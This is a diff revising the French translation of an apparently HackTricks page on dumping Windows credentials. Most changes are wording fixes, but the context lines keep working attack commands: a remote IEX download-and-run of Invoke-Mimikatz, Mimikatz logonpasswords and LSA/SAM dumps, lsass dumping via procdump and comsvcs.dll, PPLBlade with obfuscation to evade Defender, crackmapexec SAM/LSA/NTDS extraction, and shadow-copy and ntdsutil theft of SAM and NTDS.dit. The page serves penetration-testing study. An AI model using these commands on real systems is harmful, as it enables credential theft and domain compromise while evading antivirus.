@@ -2,14 +2,14 @@
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks:
+Autres façons de soutenir HackTricks :
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
@@ -36,7 +36,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Apprenez-en davantage sur certaines protections des identifiants possibles ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**
+[**Découvrez certaines protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**
 
 ## Identifiants avec Meterpreter
 
@@ -85,13 +85,13 @@ mimikatz # sekurlsa::logonPasswords
 
 Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Remarque**: Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe pour vider lsass.exe**, ceci est dû à la **détection** des chaînes **"procdump.exe" et "lsass.exe"**. Il est donc plus **furtif** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** nom lsass.exe.
+**Remarque**: Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe pour vider lsass.exe**, cela est dû à la **détection** de la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** nom lsass.exe.
 
 ### Vidage de lsass avec **comsvcs.dll**
 
-Une DLL nommée **comsvcs.dll** trouvée dans `C:\Windows\System32` est responsable du **vidage de la mémoire du processus** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée en utilisant `rundll32.exe`.\
+Une DLL nommée **comsvcs.dll** trouvée dans `C:\Windows\System32` est responsable du **vidage de la mémoire du processus** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée à l'aide de `rundll32.exe`.\
 Il est sans importance d'utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. Le PID du processus à vider constitue le premier composant, l'emplacement du fichier de vidage représente le deuxième, et le troisième composant est strictement le mot **full**. Aucune autre option n'existe.\
-En analysant ces trois composants, la DLL est engagée dans la création du fichier de vidage et le transfert de la mémoire du processus spécifié dans ce fichier.\
+En analysant ces trois composants, la DLL se charge de créer le fichier de vidage et de transférer la mémoire du processus spécifié dans ce fichier.\
 L'utilisation de **comsvcs.dll** est faisable pour vider le processus lsass, éliminant ainsi le besoin de télécharger et exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 La commande suivante est utilisée pour l'exécution:
@@ -116,13 +116,13 @@ Get-Process -Name LSASS
 ```
 ## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de Dump de Processus Protégé qui prend en charge l'obfuscation du vidage de mémoire et son transfert sur des postes de travail distants sans le déposer sur le disque.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de Dump de Processus Protégé qui prend en charge l'obfuscation du dump mémoire et son transfert sur des postes de travail distants sans le déposer sur le disque.
 
 **Fonctionnalités clés**:
 
-1. Contourner la protection PPL
-2. Obfusquer les fichiers de vidage de mémoire pour éviter les mécanismes de détection basés sur les signatures de Defender
-3. Télécharger le vidage de mémoire avec des méthodes de téléchargement RAW et SMB sans le déposer sur le disque (vidage sans fichier)
+1. Contournement de la protection PPL
+2. Obfuscation des fichiers de dump mémoire pour éviter les mécanismes de détection basés sur les signatures de Defender
+3. Téléchargement du dump mémoire avec des méthodes de téléchargement RAW et SMB sans le déposer sur le disque (dump sans fichier)
 
 {% code overflow="wrap" %}
 ```bash
@@ -136,7 +136,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Vol de secrets LSA
+### Voler les secrets LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
@@ -155,7 +155,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Vol de SAM & SYSTEM
 
-Ces fichiers devraient être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.
+Ces fichiers devraient être **localisés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.
 
 ### Depuis le Registre
 
@@ -198,6 +198,8 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
+Code du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+
 ### Invoke-NinjaCopy
 
 Enfin, vous pourriez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
@@ -211,7 +213,7 @@ Le fichier **NTDS.dit** est connu comme le cœur d'**Active Directory**, contena
 Trois tables principales sont maintenues dans cette base de données :
 
 - **Table de données** : Cette table est chargée de stocker des détails sur des objets tels que des utilisateurs et des groupes.
-- **Table de liaison** : Elle garde une trace des relations, telles que les appartenances aux groupes.
+- **Table de liens** : Elle garde une trace des relations, telles que les appartenances aux groupes.
 - **Table SD** : Les **descripteurs de sécurité** de chaque objet sont conservés ici, assurant la sécurité et le contrôle d'accès des objets stockés.
 
 Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
@@ -226,7 +228,7 @@ Le hachage est chiffré 3 fois :
 2. Décrypter le **hachage** en utilisant **PEK** et **RC4**.
 3. Décrypter le **hachage** en utilisant **DES**.
 
-**PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant la **BOOTKEY** du fichier **SYSTEM du contrôleur de domaine (différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les informations d'identification du fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant la **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les informations d'identification du fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Copie de NTDS.dit en utilisant Ntdsutil
 
@@ -234,7 +236,7 @@ Disponible depuis Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Vous pourriez également utiliser le tour de passe-passe de la **copie de l'ombre du volume** pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, **dump it from the registry or use the volume shadow copy** trick).
+Vous pourriez également utiliser le tour de la **copie de l'ombre du volume** pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, **dump it from the registry or use the volume shadow copy** trick).
 
 ### **Extraction des hachages de NTDS.dit**
 
@@ -252,11 +254,11 @@ Enfin, vous pouvez également utiliser le **module metasploit** : _post/windows/
 
 ### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**
 
-Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'ensemble des objets et de leurs attributs pour une extraction d'informations ultérieure lorsque le fichier brut NTDS.dit est déjà récupéré.
+Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'ensemble des objets et de leurs attributs pour une extraction d'informations ultérieure lorsque le fichier NTDS.dit brut est déjà récupéré.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Le ruche `SYSTEM` est facultative mais permet le décryptage des secrets (hachages NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, clés Kerberos ou de confiance, historiques de mots de passe NT & LM). En plus d'autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hachages, indicateurs UAC, horodatage du dernier accès et du changement de mot de passe, descriptions de comptes, noms, UPN, SPN, groupes et adhésions récursives, arborescence des unités organisationnelles et adhésions, domaines de confiance avec types de confiance, direction et attributs...
+Le ruche `SYSTEM` est facultative mais permet le décryptage des secrets (hachages NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, clés Kerberos ou de confiance, historiques de mots de passe NT & LM). En plus d'autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hachages, indicateurs UAC, horodatage du dernier accès et du changement de mot de passe, descriptions de comptes, noms, UPN, SPN, groupes et adhésions récursives, arborescence des unités organisationnelles et adhésions, domaines de confiance avec type de confiance, direction et attributs...
 
 ## Lazagne
 
@@ -266,9 +268,9 @@ lazagne.exe all
 ```
 ## Autres outils pour extraire des informations d'identification de SAM et LSASS
 
-### Éditeur de crédentiels Windows (WCE)
+### Windows credentials Editor (WCE)
 
-Cet outil peut être utilisé pour extraire des informations d'identification de la mémoire. Téléchargez-le depuis: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Cet outil peut être utilisé pour extraire des informations d'identification de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
@@ -302,7 +304,7 @@ Autres façons de soutenir HackTricks:
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
